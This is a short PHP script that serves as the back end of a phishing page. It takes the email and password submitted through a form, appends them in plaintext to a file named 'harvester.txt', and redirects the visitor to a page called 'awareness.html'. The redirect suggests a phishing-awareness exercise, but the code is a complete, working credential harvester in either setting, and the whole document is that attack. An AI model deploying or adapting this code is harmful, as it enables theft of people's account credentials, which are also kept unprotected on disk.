
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];
    $password = $_POST["password"];
    $data = "Email: " . $email . " | Password: " . $password . "\n";
    file_put_contents("harvester.txt", $data, FILE_APPEND);
    header("Location: awareness.html");
    exit();
}
?>
